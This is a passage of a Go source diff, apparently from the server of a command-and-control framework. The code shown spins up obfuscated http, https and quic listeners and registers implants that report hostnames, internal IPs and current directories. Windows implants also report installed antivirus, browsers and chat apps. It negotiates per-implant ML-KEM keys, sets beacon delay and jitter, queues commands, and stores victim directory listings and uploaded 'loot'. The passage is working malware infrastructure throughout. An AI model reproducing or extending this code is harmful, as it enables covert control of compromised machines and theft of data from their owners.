+						requestData.BaseRounds = generateRandomBase64Table()
+						if requestData.BaseRounds == "" {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "startServer",
+								"message": "failed to generate Base64 table",
+							})
+							continue
+						}
+						decodeMap = buildDecodeMap(requestData.BaseRounds)
+					}
+
+					switch requestData.Protocol {
+					case "http", "https", "quic":
+					default:
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "unsupported protocol",
+						})
+						continue
+					}
+
+					handler := &MainHandler{}
+					serverManager := &MyServer{}
+					startErr := protocol.Http_server(
+						handler,
+						serverManager,
+						logger,
+						requestData.Port,
+						requestData.Path,
+						requestData.ConnPath,
+						requestData.MsgPath,
+						requestData.SwitchKey,
+						requestData.Download,
+						requestData.Result,
+						requestData.Net,
+						requestData.Info,
+						requestData.Upload,
+						requestData.List,
+						requestData.Option,
+						requestData.Protocol,
+						requestData.Uid,
+						requestData.Hostname,
+						requestData.KeyPart,
+						requestData.Filekey,
+						requestData.Remark,
+						requestData.CertContent,
+						requestData.KeyContent,
+						requestData.WindowsPro,
+						requestData.BaseRounds,
+						requestData.ResponseHead,
+						username,
+						log_word,
+						func() {
+							serverRouteMu.Lock()
+							base_map[requestData.Port] = requestData.BaseRounds
+							code_map[requestData.Port] = decodeMap
+							serverRouteMu.Unlock()
+						},
+						func() {
+							cleanupServerState(requestData.Port)
+						},
+					)
+					if startErr != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "startServer",
+							"message": "server start failed: " + startErr.Error(),
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code":    200,
+						"path":    "startServer",
+						"message": "server started",
+						"port":    requestData.Port,
+					})
+				case "uploadFile":
+					uid, ok := body["uid"].(string)
+					if !ok {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "uploadFile",
+							"message": "invalid uid",
+						})
+						continue
+					}
+					filename, ok := body["filename"].(string)
+					if !ok {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "uploadFile",
+							"message": "invalid filename",
+						})
+						continue
+					}
+					splitSize, _ := body["splitSize"].(string)
+
+					// 使用统一的 uploadTask
+					uploadTask = &UploadTask{
+						Type:      "uploadFile",
+						UID:       uid,
+						Filename:  filename,
+						SplitSize: splitSize,
+					}
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "uploadFile",
+						"type": "ready",
+					})
+
+				case "chatFile":
+					filename, _ := body["filename"].(string)
+					if filename == "" || !isSafeLootPathPart(filename) {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "chatFile",
+							"message": "invalid filename",
+						})
+						continue
+					}
+					chatid := chatUID()
+					filename = fmt.Sprintf("%s_%s", chatid, filepath.Base(filename))
+
+					// 不再立即创建文件，而是使用统一的 uploadTask
+					uploadTask = &UploadTask{
+						Type:     "chatFile",
+						Username: username,
+						Filename: filename, // 已经处理好的文件名
+						Chatid:   chatid,
+					}
+
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "chatFile",
+						"type": "ready",
+					})
+				case "upload_end":
+					// 检查上传类型
+					if uploadTask == nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "upload_end",
+							"message": "no active upload task",
+						})
+						continue
+					}
+					switch uploadTask.Type {
+					case "uploadFile":
+						if err := UserUploadFile(
+							uploadTask.UID,
+							uploadTask.Filename,
+							uploadTask.SplitSize,
+							&uploadTask.Buffer,
+						); err != nil {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "uploadFile",
+								"message": err.Error(),
+							})
+							uploadTask = nil
+							continue
+						}
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    200,
+							"path":    "uploadFile",
+							"message": "upload success",
+						})
+					case "chatFile":
+						// 保存文件
+						if err := os.MkdirAll("./chat_uploads/", 0755); err != nil {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "chatFile",
+								"message": "mkdir failed",
+							})
+							uploadTask = nil
+							continue
+						}
+						if !isSafeLootPathPart(uploadTask.Filename) {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    400,
+								"path":    "chatFile",
+								"message": "invalid filename",
+							})
+							uploadTask = nil
+							continue
+						}
+						savePath := filepath.Join("./chat_uploads/", uploadTask.Filename)
+						err := os.WriteFile(savePath, uploadTask.Buffer.Bytes(), 0644)
+						if err != nil {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code":    500,
+								"path":    "chatFile",
+								"message": "file save failed",
+							})
+							uploadTask = nil
+							continue
+						}
+						// 创建聊天记录
+						chat := Chat{
+							Username: uploadTask.Username,
+							Message:  uploadTask.Filename,
+							Time:     time.Now().Format("2006-01-02 15:04:05"),
+							Chatid:   uploadTask.Chatid,
+							Type:     "file",
+						}
+						dataChatmu.Lock()
+						data_chat.Chats = append(data_chat.Chats, chat)
+						dataChatmu.Unlock()
+
+						go PushAgentData(uploadTask.Chatid, "updateChat")
+
+						logger.WriteLog(
+							fmt.Sprintf(
+								log_word["chat_file"],
+								uploadTask.Username,
+								uploadTask.Filename,
+							),
+						)
+
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 200,
+							"path": "chatFile",
+							"data": chat,
+						})
+					}
+					uploadTask = nil
+				default:
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 400,
+						"path": "unknown",
+
+						"message": "unknown path",
+					})
+				}
+			case websocket.BinaryMessage:
+				if uploadTask != nil {
+					_, err := uploadTask.Buffer.Write(message)
+					if err != nil {
+						uploadTask = nil
+						return
+					}
+				}
+			}
+		}
+	}
+}
+
+func getOptionalInt64(body map[string]interface{}, key string) (int64, bool, error) {
+	raw, ok := body[key]
+	if !ok || raw == nil {
+		return 0, false, nil
+	}
+	switch v := raw.(type) {
+	case int:
+		return int64(v), true, nil
+	case int32:
+		return int64(v), true, nil
+	case int64:
+		return v, true, nil
+	case float32:
+		if v != float32(int64(v)) {
+			return 0, true, fmt.Errorf("%s must be an integer", key)
+		}
+		return int64(v), true, nil
+	case float64:
+		if v != float64(int64(v)) {
+			return 0, true, fmt.Errorf("%s must be an integer", key)
+		}
+		return int64(v), true, nil
+	case json.Number:
+		n, err := v.Int64()
+		if err != nil {
+			return 0, true, err
+		}
+		return n, true, nil
+	case string:
+		n, err := strconv.ParseInt(v, 10, 64)
+		if err != nil {
+			return 0, true, err
+		}
+		return n, true, nil
+	default:
+		return 0, true, fmt.Errorf("%s must be an integer", key)
+	}
+}
+
+func parseDownloadRange(body map[string]interface{}, totalSize int64) (offset int64, sendSize int64, chunked bool, err error) {
+	offset, hasOffset, err := getOptionalInt64(body, "offset")
+	if err != nil {
+		return 0, 0, false, fmt.Errorf("invalid offset: %w", err)
+	}
+	chunkSize, hasChunkSize, err := getOptionalInt64(body, "chunkSize")
+	if err != nil {
+		return 0, 0, false, fmt.Errorf("invalid chunkSize: %w", err)
+	}
+	chunked = hasOffset || hasChunkSize
+	if !hasOffset {
+		offset = 0
+	}
+	if offset < 0 {
+		return 0, 0, false, fmt.Errorf("offset must be >= 0")
+	}
+	if offset > totalSize {
+		return 0, 0, false, fmt.Errorf("offset exceeds file size")
+	}
+	remaining := totalSize - offset
+	if !hasChunkSize {
+		sendSize = remaining
+	} else {
+		if chunkSize <= 0 {
+			return 0, 0, false, fmt.Errorf("chunkSize must be > 0")
+		}
+		sendSize = chunkSize
+		if sendSize > remaining {
+			sendSize = remaining
+		}
+	}
+	return offset, sendSize, chunked, nil
+}
+
+type binaryMessageWriter interface {
+	WriteMessage(messageType int, data []byte) error
+}
+
+func writeBinaryRange(clientWs binaryMessageWriter, file *os.File, offset int64, sendSize int64) (int64, error) {
+	if _, err := file.Seek(offset, io.SeekStart); err != nil {
+		return 0, err
+	}
+	buf := make([]byte, 32*1024)
+	remaining := sendSize
+	sent := int64(0)
+	for remaining > 0 {
+		readLen := len(buf)
+		if int64(readLen) > remaining {
+			readLen = int(remaining)
+		}
+		n, err := file.Read(buf[:readLen])
+		if n > 0 {
+			if writeErr := clientWs.WriteMessage(websocket.BinaryMessage, buf[:n]); writeErr != nil {
+				return sent, writeErr
+			}
+			sent += int64(n)
+			remaining -= int64(n)
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return sent, err
+		}
+	}
+	return sent, nil
+}
+
+func valueToText(v any) (string, error) {
+	if v == nil {
+		return "null", nil
+	}
+	switch x := v.(type) {
+	case string:
+		return x, nil
+	case json.Number:
+		return x.String(), nil
+	case bool:
+		return strconv.FormatBool(x), nil
+	}
+	rv := reflect.ValueOf(v)
+	switch rv.Kind() {
+	case reflect.String:
+		return rv.String(), nil
+	case reflect.Bool:
+		return strconv.FormatBool(rv.Bool()), nil
+	case reflect.Int, reflect.Int8, reflect.Int16,
+		reflect.Int32, reflect.Int64:
+		return strconv.FormatInt(rv.Int(), 10), nil
+	case reflect.Uint, reflect.Uint8, reflect.Uint16,
+		reflect.Uint32, reflect.Uint64, reflect.Uintptr:
+		return strconv.FormatUint(rv.Uint(), 10), nil
+	case reflect.Float32, reflect.Float64:
+		f := rv.Float()
+		if math.IsNaN(f) || math.IsInf(f, 0) {
+			return "", fmt.Errorf("invalid number")
+		}
+		return strconv.FormatFloat(
+			f,
+			'f',
+			-1,
+			rv.Type().Bits(),
+		), nil
+	}
+	data, err := json.Marshal(v)
+	if err != nil {
+		return "", err
+	}
+	return string(data), nil
+}
+
+func normalizePort(v any) (string, error) {
+	text, err := valueToText(v)
+	if err != nil {
+		return "", err
+	}
+	text = strings.TrimSpace(text)
+	if port, err := strconv.ParseInt(text, 10, 64); err == nil {
+		if port < 1 || port > 65535 {
+			return "", fmt.Errorf("port must be between 1 and 65535")
+		}
+
+		return strconv.FormatInt(port, 10), nil
+	}
+	number, err := strconv.ParseFloat(text, 64)
+	if err != nil ||
+		math.IsNaN(number) ||
+		math.IsInf(number, 0) ||
+		math.Trunc(number) != number ||
+		number < 1 ||
+		number > 65535 {
+		return "", fmt.Errorf("port must be an integer between 1 and 65535")
+	}
+	return strconv.FormatInt(int64(number), 10), nil
+}
+
+func normalizeResponseHeaders(v any) (map[string]string, error) {
+	var raw map[string]any
+	switch value := v.(type) {
+	case nil:
+		return map[string]string{}, nil
+	case string:
+		text := strings.TrimSpace(value)
+		if text == "" || text == "null" {
+			return map[string]string{}, nil
+		}
+		if err := json.Unmarshal([]byte(text), &raw); err != nil {
+			return nil, fmt.Errorf("response_head must be a valid JSON object")
+		}
+	case map[string]any:
+		raw = value
+	case map[string]string:
+		raw = make(map[string]any, len(value))
+		for key, item := range value {
+			raw[key] = item
+		}
+	default:
+		return nil, fmt.Errorf(
+			"response_head must be a JSON object or JSON string",
+		)
+	}
+	result := make(map[string]string, len(raw))
+	for key, value := range raw {
+		key = strings.TrimSpace(key)
+		if key == "" {
+			return nil, fmt.Errorf("response header name cannot be empty")
+		}
+		text, err := valueToText(value)
+		if err != nil {
+			return nil, fmt.Errorf(
+				"invalid value for response header %q",
+				key,
+			)
+		}
+		if strings.ContainsAny(key, "\r\n") ||
+			strings.ContainsAny(text, "\r\n") {
+			return nil, fmt.Errorf(
+				"response header %q contains invalid characters",
+				key,
+			)
+		}
+		if strings.EqualFold(key, "status") {
+			statusText := strings.TrimSpace(text)
+			statusCode, err := strconv.Atoi(statusText)
+			if err != nil || statusCode < 100 || statusCode > 999 {
+				return nil, fmt.Errorf(
+					"response status must be an integer between 100 and 999",
+				)
+			}
+			text = strconv.Itoa(statusCode)
+		}
+		result[key] = text
+	}
+	return result, nil
+}
+
+// 接收
+func GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
+	var server_remark string
+	data := Get_decry_s(&encry_str, &key, code_map)
+	var dataList []string
+	if err := json.Unmarshal([]byte(data), &dataList); err != nil {
+		return
+	}
+	if len(dataList) < 11 {
+		return
+	}
+	shellname := dataList[0]
+	username := dataList[1]
+	osname := dataList[2]
+	t := dataList[3]
+	innet_ip := dataList[4]
+	currentDir := dataList[5]
+	version := dataList[6]
+	port := dataList[7]
+	protocol := dataList[8]
+	jitter := dataList[9]
+	executable := dataList[10]
+
+	current := time.Now()
+	formattedTime := current.Format("2006.01.02 15:04")
+	Remarks := "null"
+	hash := md5.New()
+	hash.Write([]byte(key))
+	hashBytes := hash.Sum(nil)
+	hashString := hex.EncodeToString(hashBytes)
+	timeInt, _ := strconv.Atoi(t)
+	jitterInt, _ := strconv.Atoi(jitter)
+	proto := protocol + ":" + port
+
+	serverChan := make(chan string)
+	go updateServerClients(port, serverChan)
+	server_remark = <-serverChan
+
+	go put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, proto, timeInt, jitterInt)
+	log_str1 := fmt.Sprintf(log_word["agent_online"],
+		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString)
+	logger.WriteLog(log_str1)
+	go DeleteEntry(uid)
+}
+func Windows_GetInfo(uid, encry_str, clientIP string, key []byte, code_map map[byte]int) {
+	data := Get_decry_s(&encry_str, &key, code_map)
+	var data_list []string
+	if err := json.Unmarshal([]byte(data), &data_list); err != nil {
+		return
+	}
+	if len(data_list) < 19 { // 需要11个字段
+		return
+	}
+	// 解析 Windows 专用的扩展字段
+	shellname := data_list[0]
+	username := data_list[1]
+	osname := data_list[2]
+	t := data_list[3]
+	innet_ip := data_list[4]
+	currentDir := data_list[5]
+	version := data_list[6]
+	port := data_list[7]
+	protocol := data_list[8]
+	jitter := data_list[9]
+	executable := data_list[10]
+	macs := data_list[11]       // MAC地址
+	cpuInfo := data_list[12]    // CPU信息
+	antivirus := data_list[13]  // 杀毒软件
+	browsers := data_list[14]   // 浏览器信息
+	chatApps := data_list[15]   // 聊天应用
+	memoryStr := data_list[16]  // 内存使用情况
+	systemType := data_list[17] // 系统类型
+	arch := data_list[18]       // 架构信息
+	current := time.Now()
+	formattedTime := current.Format("2006.01.02 15:04")
+	// 计算 key hash
+	hash := md5.New()
+	hash.Write([]byte(key))
+	hashBytes := hash.Sum(nil)
+	hashString := hex.EncodeToString(hashBytes)
+	timeInt, _ := strconv.Atoi(t)
+	jitterInt, _ := strconv.Atoi(jitter)
+	proto := protocol + ":" + port
+	// 查找并更新服务器客户端数量
+
+	var server_remark string
+	serverChan := make(chan string)
+	go updateServerClients(port, serverChan)
+	server_remark = <-serverChan
+
+	Remarks := "null"
+	go Windows_put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, timeInt, jitterInt, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch, proto)
+	// 记录详细的 Windows 信息日志
+	log_str := fmt.Sprintf(log_word["windows_agent_online"],
+		username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString, macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
+	logger.WriteLog(log_str)
+	// 删除连接条目
+	go DeleteEntry(uid)
+}
+func updateServerClients(port string, serverChan chan<- string) {
+	serverRemark := "unknown"
+	serverDataMu.RLock()
+	for i := range server_data.Servers {
+		server := &server_data.Servers[i]
+		if port == server.Port {
+			// server.Clients++
+			serverRemark = server.Remark
+			break
+		}
+	}
+	serverDataMu.RUnlock()
+	serverChan <- serverRemark
+}
+func Change_pro(uid, username, remarks, delay, jitter, Taskid, port string) string {
+	windows_clientMu.Lock()
+	defer windows_clientMu.Unlock()
+
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		if uid != client.Uid {
+			continue
+		}
+
+		intDelay, err := strconv.Atoi(delay)
+		if err != nil {
+			return "delay is not int"
+		}
+		intJitter, err := strconv.Atoi(jitter)
+		if err != nil {
+			return "jitter is not int"
+		}
+		if intDelay < 1 {
+			intDelay = 1
+		}
+		if intJitter <= 0 {
+			intJitter = 5
+		}
+
+		usernameModified, remarksModified := false, false
+		delayModified, jitterModified := false, false
+
+		if username != client.Username {
+			for j := range windows_client_data.Clients {
+				if windows_client_data.Clients[j].Username == username {
+					return "user already exists"
+				}
+			}
+			client.Username = username
+			usernameModified = true
+		}
+		if remarks != client.Remarks {
+			client.Remarks = remarks
+			remarksModified = true
+		}
+		if intDelay != client.Delay {
+			client.Delay = intDelay
+			delayModified = true
+			go Getcmd(uid, makeCommand("GET_DELAY",strconv.Itoa(intDelay)), Taskid, port)
+		}
+		if intJitter != client.Jitter {
+			client.Jitter = intJitter
+			jitterModified = true
+			go Getcmd(uid,  makeCommand("GET_JITTER",strconv.Itoa(intJitter)), Taskid, port)
+		}
+		if !usernameModified && !remarksModified && !delayModified && !jitterModified {
+			return "No changes needed"
+		}
+
+		go PushAgentData(uid, "updateWinIndex")
+		return "confirm"
+	}
+	return "nil"
+}
+
+func Change(uid, username, remarks, delay, jitter, Taskid, port string) string {
+	clientDataMu.Lock()
+	defer clientDataMu.Unlock()
+
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		if uid != client.Uid {
+			continue
+		}
+
+		intDelay, err := strconv.Atoi(delay)
+		if err != nil {
+			return "delay is not int"
+		}
+		intJitter, err := strconv.Atoi(jitter)
+		if err != nil {
+			return "jitter is not int"
+		}
+		if intDelay < 1 {
+			intDelay = 1
+		}
+		if intJitter <= 0 {
+			intJitter = 5
+		}
+
+		usernameModified, remarksModified := false, false
+		delayModified, jitterModified := false, false
+
+		if username != client.Username {
+			for j := range client_data.Clients {
+				if client_data.Clients[j].Username == username {
+					return "user already exists"
+				}
+			}
+			client.Username = username
+			usernameModified = true
+		}
+		if remarks != client.Remarks {
+			client.Remarks = remarks
+			remarksModified = true
+		}
+		if intDelay != client.Delay {
+			client.Delay = intDelay
+			delayModified = true
+			go Getcmd(uid, makeCommand("GET_DELAY",strconv.Itoa(intDelay)), Taskid, port)
+		}
+		if intJitter != client.Jitter {
+			client.Jitter = intJitter
+			jitterModified = true
+			go Getcmd(uid, makeCommand("GET_JITTER",strconv.Itoa(intJitter)), Taskid, port)
+		}
+		if !usernameModified && !remarksModified && !delayModified && !jitterModified {
+			return "No changes needed"
+		}
+
+		go PushAgentData(uid, "updateIndex")
+		return "confirm"
+	}
+	return "nil"
+}
+
+func getClientIP(r *http.Request) string {
+	addrPort, err := netip.ParseAddrPort(strings.TrimSpace(r.RemoteAddr))
+	if err != nil {
+		return ""
+	}
+
+	return addrPort.Addr().Unmap().String()
+}
+
+// 返回给前端的 JSON 结构
+type ClientInfo struct {
+	Uid        string `json:"uid"`
+	Host       string `json:"host"`
+	OnlineTime string `json:"online_time"`
+	ShellIP    string `json:"shell_ip"`
+}
+
+func Listen() string {
+	seen := make(map[string]bool)
+	dataConnMu.RLock()
+	defer dataConnMu.RUnlock()
+	clients := make([]ClientInfo, 0, len(data_conn.Conns))
+	for i := range data_conn.Conns {
+		client := &data_conn.Conns[i]
+		if client.Uid == "" {
+			continue
+		}
+		if seen[client.Uid] {
+			continue
+		}
+		seen[client.Uid] = true
+		clients = append(clients, ClientInfo{
+			Uid:        client.Uid,
+			Host:       client.Host,
+			OnlineTime: client.OnlineTime,
+			ShellIP:    client.ShellIP,
+		})
+	}
+	b, err := json.Marshal(clients)
+	if err != nil {
+		return "[]"
+	}
+	return string(b)
+}
+
+func updateListen(uid string) []ClientInfo {
+	dataConnMu.RLock()
+	defer dataConnMu.RUnlock()
+	for i := range data_conn.Conns {
+		client := &data_conn.Conns[i]
+		if uid == client.Uid {
+			return []ClientInfo{{
+				Uid:        client.Uid,
+				Host:       client.Host,
+				OnlineTime: client.OnlineTime,
+				ShellIP:    client.ShellIP,
+			}}
+		}
+	}
+	return nil
+}
+
+func validMLKEMKeyPair(pair mlkemKeyPair) bool {
+	if len(pair.private) != mlkem.SeedSize ||
+		len(pair.public) != mlkem.EncapsulationKeySize768 {
+		return false
+	}
+
+	decapsulationKey, err := mlkem.NewDecapsulationKey768(pair.private)
+	if err != nil {
+		return false
+	}
+
+	derivedPublic := decapsulationKey.EncapsulationKey().Bytes()
+
+	return len(derivedPublic) == mlkem.EncapsulationKeySize768 &&
+		bytes.Equal(derivedPublic, pair.public)
+}
+
+func insertKeyMap(uid string) (created bool, exists bool) {
+	if uid == "" {
+		return false, false
+	}
+
+	mlkemKeysMu.Lock()
+	defer mlkemKeysMu.Unlock()
+
+	if pair, ok := mlkemKeys[uid]; ok {
+		if validMLKEMKeyPair(pair) {
+			return false, true
+		}
+
+		clear(pair.private)
+		clear(pair.public)
+		delete(mlkemKeys, uid)
+	}
+
+	decapsulationKey, err := mlkem.GenerateKey768()
+	if err != nil || decapsulationKey == nil {
+		return false, false
+	}
+
+	privateKeyBytes := append([]byte(nil), decapsulationKey.Bytes()...)
+	publicKeyBytes := append([]byte(nil), decapsulationKey.EncapsulationKey().Bytes()...)
+
+	newPair := mlkemKeyPair{
+		private: privateKeyBytes,
+		public:  publicKeyBytes,
+	}
+
+	if !validMLKEMKeyPair(newPair) {
+		clear(privateKeyBytes)
+		clear(publicKeyBytes)
+		return false, false
+	}
+
+	mlkemKeys[uid] = newPair
+	return true, false
+}
+
+// 接收客户端中间值添加与服务器私钥交互计算出最终密钥
+func Switch_key(uid string, clientCiphertext []byte) {
+	if uid == "" {
+		return
+	}
+
+	if len(clientCiphertext) != mlkem.CiphertextSize768 {
+		return
+	}
+
+	var privateKeyBytes []byte
+
+	mlkemKeysMu.RLock()
+	pair, exists := mlkemKeys[uid]
+	if exists {
+		privateKeyBytes = append([]byte(nil), pair.private...)
+	}
+	mlkemKeysMu.RUnlock()
+
+	if !exists || len(privateKeyBytes) != mlkem.SeedSize {
+		return
+	}
+
+	decapsulationKey, err := mlkem.NewDecapsulationKey768(privateKeyBytes)
+	if err != nil {
+		return
+	}
+
+	sharedBytes, err := decapsulationKey.Decapsulate(clientCiphertext)
+	if err != nil {
+		return
+	}
+
+	if len(sharedBytes) != mlkem.SharedKeySize {
+		return
+	}
+
+	finalKey := append([]byte(nil), sharedBytes...)
+
+	hash := md5.New()
+	hash.Write([]byte(finalKey))
+	hashBytes := hash.Sum(nil)
+	hashString := hex.EncodeToString(hashBytes)
+
+	log_str := fmt.Sprintf(log_word["agent_key"],uid,hashString)
+	logger.WriteLog(log_str)
+
+	keyMu.Lock()
+	key_map[uid] = finalKey
+	keyMu.Unlock()
+}
+
+func deleteMLKEMKey(uid string) {
+	if uid == "" {
+		return
+	}
+	mlkemKeysMu.Lock()
+	defer mlkemKeysMu.Unlock()
+	pair, exists := mlkemKeys[uid]
+	if !exists {
+		return
+	}
+	clear(pair.private)
+	clear(pair.public)
+	delete(mlkemKeys, uid)
+}
+
+func cleanupDeletedUID(uid string, deletedIndex int) {
+
+	deleteMLKEMKey(uid)
+
+	go PushWS(
+		"",
+		"send_delListen",
+		map[string]interface{}{
+			"uid":   uid,
+			"index": deletedIndex,
+		},
+	)
+}
+
+func deleteConnAtIndex(index int) (string,bool) {
+	if index < 0 {
+		return "false",false
+	}
+
+	var uid string
+	dataConnMu.Lock()
+	if index >= len(data_conn.Conns) {
+		dataConnMu.Unlock()
+		return "false",false
+	}
+
+	conn := &data_conn.Conns[index]
+	uid = conn.Uid
+	data_conn.Conns = append(
+		data_conn.Conns[:index],
+		data_conn.Conns[index+1:]...,
+	)
+	dataConnMu.Unlock()
+
+	cleanupDeletedUID(uid, index)
+	return uid,true
+}
+
+func DeleteEntry(delshell string) {
+	if delshell == "" {
+		return
+	}
+
+	dataConnMu.Lock()
+	index := -1
+	for i := range data_conn.Conns {
+		conn := &data_conn.Conns[i]
+		if conn.Uid == delshell {
+			index = i
+			break
+		}
+	}
+	if index == -1 {
+		dataConnMu.Unlock()
+		return
+	}
+
+	conn := &data_conn.Conns[index]
+	uid := conn.Uid
+	data_conn.Conns = append(
+		data_conn.Conns[:index],
+		data_conn.Conns[index+1:]...,
+	)
+	dataConnMu.Unlock()
+
+	cleanupDeletedUID(uid, index)
+}
+
+// 写入目录列表
+func Put_file_list(uid, file, taskid string, code_rounds map[byte]int) {
+	keyMu.RLock()
+	key, exists := key_map[uid]
+	keyMu.RUnlock()
+	if !exists {
+		return
+	}
+	decryptedData := Get_decry_s(&file, &key, code_rounds)
+	decryptedTask := Get_decry_s(&taskid, &key, code_rounds)
+	var dir, list string
+	var dataList []string
+	if err := json.Unmarshal([]byte(decryptedData), &dataList); err != nil {
+		return
+	}
+	if len(dataList) == 2 {
+		list = dataList[0]
+		dir = dataList[1]
+	} else {
+		dir = decryptedData
+	}
+	fileMu.RLock()
+	queue, ok := msgFileQueue[uid]
+	fileMu.RUnlock()
+	if !ok {
+		fileMu.Lock()
+		if queue, ok = msgFileQueue[uid]; !ok {
+			queue = &fileQueue{files: make([]Msg_file, 0)}
+			msgFileQueue[uid] = queue
+		}
+		fileMu.Unlock()
+	}
+	queue.mu.Lock()
+	queue.files = append(queue.files, Msg_file{
+		Uid:    uid,
+		Taskid: decryptedTask,
+		File:   dir,
+	})
+	queue.mu.Unlock()
+	go save_file_list(uid, dir, list)
+}
+
+// 读取文件列表
+func Get_file_list(uid, taskid string) string {
+	// 1. 快速定位该 UID 的队列
+	fileMu.RLock()
+	queue, exists := msgFileQueue[uid]
+	fileMu.RUnlock()
+	if !exists {
+		return ""
+	}
+	queue.mu.Lock()
+	defer queue.mu.Unlock()
+	for i := range queue.files {
+		item := &queue.files[i]
+		if item.Taskid == taskid {
+			fileContent := item.File
+			queue.files = append(queue.files[:i], queue.files[i+1:]...)
+			return fileContent
+		}
+	}
+	return ""
+}
+
+// 按索引删除客户端目录缓存
+func Del_file_list(uid, indexStr string) bool {
+	fcache.Lock()
+	defer fcache.Unlock()
+	index, err := strconv.Atoi(indexStr)
+	if err != nil {
+		return false
+	}
+	// 找到 uid 对应的所有文件的索引
+	var uidIndices []int
+	for i := range msg_file_cache {
+		item := &msg_file_cache[i]
+		if item.Uid == uid {
+			uidIndices = append(uidIndices, i)
+		}
+	}
+	if index < 0 || index >= len(uidIndices) {
+		return false
+	}
+	// 删除对应索引的文件
+	delIdx := uidIndices[index]
+	msg_file_cache = append(msg_file_cache[:delIdx], msg_file_cache[delIdx+1:]...)
+	return true
+}
+
+// 读取目录缓存给客户端
+type file_json struct {
+	List string `json:"list"`
+	File string `json:"file"`
+}
+
+func Read_file_list(uid string) []file_json {
+	fcache.RLock()
+	defer fcache.RUnlock()
+	fileList := make([]file_json, 0)
+	for i := range msg_file_cache {
+		item := &msg_file_cache[i]
+		if item.Uid == uid {
+			fileItem := file_json{
+				List: item.Taskid,
+				File: item.File,
+			}
+			fileList = append(fileList, fileItem)
+		}
+	}
+	return fileList
+}
+func updateGetMsgCache(uid string) []file_json {
+	fcache.RLock()
+	defer fcache.RUnlock()
+	// 只返回最新的一条目录缓存
+	for i := len(msg_file_cache) - 1; i >= 0; i-- {
+		item := &msg_file_cache[i]
+		if item.Uid == uid {
+			return []file_json{{
+				List: item.Taskid,
+				File: item.File,
+			}}
+		}
+	}
+	return []file_json{}
+}
+
+// 缓存客户端目录
+func save_file_list(uid, file, list string) {
+	fcache.Lock()
+	defer fcache.Unlock()
+	for i := range msg_file_cache {
+		item := &msg_file_cache[i]
+		if item.Uid == uid && item.Taskid == list {
+			item.File = file
+
+			go PushAgentData(uid, "updateGetMsgCache")
+
+			return
+		}
+	}
+	// 不存在则追加
+	msg_file_cache = append(msg_file_cache, Msg_file{
+		Uid:    uid,
+		Taskid: list,
+		File:   file,
+	})
+
+	go PushAgentData(uid, "updateGetMsgCache")
+
+}
+
+func sendMsg(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+	mapMu.RLock()
+	defer mapMu.RUnlock()
+	msgList := make([]string, 0)
+	for i := range msg_map_list {
+		msg := &msg_map_list[i]
+		if msg.Uid == uid {
+			msgList = append(
+				msgList,
+				msg.Taskid+":"+msg.Result,
+			)
+		}
+	}
+	return msgList
+}
+
+func updateGetMsgPost(uid string) []string {
+	if uid == "" {
+		return []string{}
+	}
+	mapMu.RLock()
+	defer mapMu.RUnlock()
+	// 只返回最新的一条消息
+	for i := len(msg_map_list) - 1; i >= 0; i-- {
+		msg := &msg_map_list[i]
+		if msg.Uid == uid {
+			return []string{msg.Taskid + ":" + msg.Result}
+		}
+	}
+	return []string{}
+}
+
+// 缓存客户端消息
+func SaveMsg(uid, msg, Taskid string) {
+	mapMu.Lock()
+	defer mapMu.Unlock()
+	msg_map_list = append(msg_map_list, Msg_result{
+		Uid:    uid,
+		Result: msg,
+		Taskid: Taskid,
+	})
+}
+func getOrCreateQueue(uid string) *uidMsgQueue {
+	queuesMu.RLock()
+	q := msgQueues[uid]
+	queuesMu.RUnlock()
+	if q != nil {
+		return q
+	}
+	queuesMu.Lock()
+	q = msgQueues[uid]
+	if q == nil {
+		q = &uidMsgQueue{messages: make([]Msg_get, 0, 16)}
+		msgQueues[uid] = q
+	}
+	queuesMu.Unlock()
+	return q
+}
+func ChangeMsh(uid, s_id, pos string) (bool, string) {
+	if uid == "" {
+		return false, "missing uid"
+	}
+
+	sID, err1 := strconv.Atoi(s_id)
+	posI, err2 := strconv.Atoi(pos)
+	if err1 != nil || err2 != nil {
+		return false, "invalid s_id/pos"
+	}
+
+	queuesMu.RLock()
+	q := msgQueues[uid]
+	queuesMu.RUnlock()
+	if q == nil {
+		return false, "queue not found"
+	}
+
+	q.mu.Lock()
+	defer q.mu.Unlock()
+
+	n := len(q.messages)
+	if n == 0 {
+		return false, "queue empty"
+	}
+	if sID < 0 || sID >= n {
+		return false, "s_id out of range"
+	}
+	if posI < 0 || posI > n {
+		return false, "pos out of range"
+	}
+
+	item := q.messages[sID]
+
+	// 删除 sID
